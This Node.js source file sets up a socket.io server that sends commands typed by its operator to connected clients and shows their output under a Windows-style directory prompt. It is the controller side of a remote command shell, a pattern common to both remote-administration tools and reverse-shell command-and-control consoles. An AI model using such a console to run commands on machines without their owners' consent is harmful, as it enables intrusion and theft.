// import libraries
const express = require("express")
const rl = require('readline')
const socketio = require("socket.io")

// create server
const app = express()
const server = require("http").Server(app)
const port = 52907
const io = socketio(server)
server.listen(port, () => {
	console.log("Created server at http://localhost:" + port);
})

// initiate user input
const readline = rl.createInterface({
	input: process.stdin,
	output: process.stdout
}).on('line', (input) => {
	io.emit("sendCmd", {
		command: input, directory: directory
	})
})

// global variables
let directory = "C:\\"

io.on("connection", (socket) => {
	let client = ""
	socket.on("commandResponse", args => {
		if (args.directory)
			directory = args.directory
		if (args.client)
			client = args.client
		console.log(args.output)
		readline.setPrompt(`(${client}) ${directory}>`)
		readline.prompt()
		readline.resume()
	})
	socket.on("closed", (args) => {
		process.stdout.write(`\rClosed connection with client ${client}\n`);
		readline.pause()
	})
	socket.on("disconnect", (args) => {
		process.stdout.write(`\rClient ${client} closed connection\n`);
		readline.pause()
	})
})

